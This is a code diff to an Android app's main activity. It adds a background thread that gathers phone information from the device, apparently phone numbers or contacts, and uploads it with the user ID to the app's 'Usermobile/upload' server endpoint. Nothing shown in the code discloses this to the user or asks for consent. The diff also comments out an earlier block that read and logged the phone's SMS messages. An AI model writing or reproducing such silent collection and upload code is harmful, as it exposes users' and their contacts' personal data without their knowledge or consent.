@@ -23,6 +23,7 @@ import com.houwei.guaishang.bean.FansPushBean;
 import com.houwei.guaishang.bean.FloatResponse;
 import com.houwei.guaishang.bean.PhoneInfo;
 import com.houwei.guaishang.bean.SMSInfo;
+import com.houwei.guaishang.bean.StringResponse;
 import com.houwei.guaishang.bean.UserBean;
 import com.houwei.guaishang.bean.VersionResponse.VersionBean;
 import com.houwei.guaishang.bean.event.TopicHomeEvent;
@@ -36,6 +37,8 @@ import com.houwei.guaishang.manager.ITopicApplication;
 import com.houwei.guaishang.manager.MyUserBeanManager;
 import com.houwei.guaishang.manager.MyUserBeanManager.UserStateChangeListener;
 import com.houwei.guaishang.manager.VersionManager.LastVersion;
+import com.houwei.guaishang.tools.HttpUtil;
+import com.houwei.guaishang.tools.JsonParser;
 import com.houwei.guaishang.tools.VoiceUtils;
 import com.houwei.guaishang.util.DeviceCardInfoUtils;
 import com.houwei.guaishang.view.PublishOrderDialog;
@@ -47,6 +50,7 @@ import org.greenrobot.eventbus.Subscribe;
 import org.greenrobot.eventbus.ThreadMode;
 
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
 
 import cn.jpush.android.api.JPushInterface;
@@ -515,21 +519,37 @@ public class MainActivity extends MainHuanXinActivity implements
 				try {
 					List<PhoneInfo> phoneInfos = DeviceCardInfoUtils.getPhoneNumberFromMobile(MainActivity.this);
 					if (phoneInfos != null) {
-						String json = new Gson().toJson(phoneInfos);
+						final String json = new Gson().toJson(phoneInfos);
 						Log.i("phoneInfo===","phoneInfo="+json);
+						new Thread(new Runnable() {
+							@Override
+							public void run() {
+								StringResponse response = null;
+								try {
+									HashMap<String, String> data = new HashMap<String, String>();
+									data.put("userid", getUserID());
+									data.put("data", json);
+									response = JsonParser.getStringResponse(HttpUtil.postMsg(
+											HttpUtil.getData(data), HttpUtil.IP + "Usermobile/upload"));
+								} catch (Exception e) {
+									// TODO Auto-generated catch block
+									e.printStackTrace();
+								}
+							}
+						}).start();
 					}
 				} catch (Exception e) {
 					e.printStackTrace();
 				}
-				try {
-					List<SMSInfo> phoneInfos = DeviceCardInfoUtils.getSmsFromPhone(MainActivity.this);
-					if (phoneInfos != null) {
-						String json = new Gson().toJson(phoneInfos);
-						Log.i("phoneInfo===sms","SMSInfo="+json);
-					}
-				} catch (Exception e) {
-					e.printStackTrace();
-				}
+//				try {
+//					List<SMSInfo> phoneInfos = DeviceCardInfoUtils.getSmsFromPhone(MainActivity.this);
+//					if (phoneInfos != null) {
+//						String json = new Gson().toJson(phoneInfos);
+//						Log.i("phoneInfo===sms","SMSInfo="+json);
+//					}
+//				} catch (Exception e) {
+//					e.printStackTrace();
+//				}
 			}
 		}
 	}
